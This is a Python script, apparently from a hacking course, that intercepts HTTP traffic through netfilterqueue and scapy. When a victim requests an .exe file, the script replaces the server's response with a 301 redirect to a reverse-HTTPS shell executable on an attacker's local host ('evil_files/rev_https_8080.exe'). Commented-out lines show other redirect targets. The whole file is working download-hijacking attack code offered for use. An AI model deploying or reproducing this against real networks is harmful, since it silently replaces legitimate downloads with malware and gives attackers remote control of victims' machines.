
#!/usr/bin/env python
import netfilterqueue

import scapy.all as scapy

ack_list = []
def set_load(packet, load):

    packet[scapy.Raw].load = load

    # Remove the old lengths and checksums so that they get automatically reset by scapy

    del packet[scapy.IP].len

    del packet[scapy.IP].chksum

    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):

    # Get the packet payload and convert it to a scapy packet to be able to inspect all layers

    scapy_packet = scapy.IP(packet.get_payload())

    # print(scapy_packet.show())



    # HTTP payload is placed within the Raw layer in scapy

    if scapy_packet.haslayer(scapy.Raw):

        # Check if the packet is going to an HTTP server

        if scapy_packet[scapy.TCP].dport == 80:

            # print("[+] HTTP Request")

            # print(scapy_packet.show())

            # Check for the extension of the files that we are interested in

            # For Python 3

            if ".exe" in str(scapy_packet[scapy.Raw].load):


            # For Python 2

            # if ".exe" in scapy_packet[scapy.Raw].load:
            

                print("[+] exe Request")

                # Store the acknowledgment number so that we can match it against the sequence number

                # in the response packet later to correctly associate HTTP requests to the corresponding HTTP responses

                ack_list.append(scapy_packet[scapy.TCP].ack)



        # Check if the packet is coming from an HTTP server

        elif scapy_packet[scapy.TCP].sport == 80:

            # print("[+] HTTP Response")

            # print(scapy.Raw.show())

            if scapy_packet[scapy.TCP].seq in ack_list:

                ack_list.remove(scapy_packet[scapy.TCP].seq)

                print("[+] Replacing file")

                # Replace the load to serve a forged file to the victim instead of the requested file

                # modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-621.exe\n\n")

                # modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.8.130/evil-files/image.jpg\n\n")

                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.67.35/evil_files/rev_https_8080.exe\n\n")



                # Store the forged response in the response packet

                # For Python 2

                # packet.set_payload(str(modified_packet))

                # For Python 3

                packet.set_payload(bytes(modified_packet))

               

    packet.accept()





queue = netfilterqueue.NetfilterQueue()

# Associate the net filter queue object to the filter queue of the Linux machine

# based on the number we assigned to the queue previously

queue.bind(0, process_packet)

queue.run()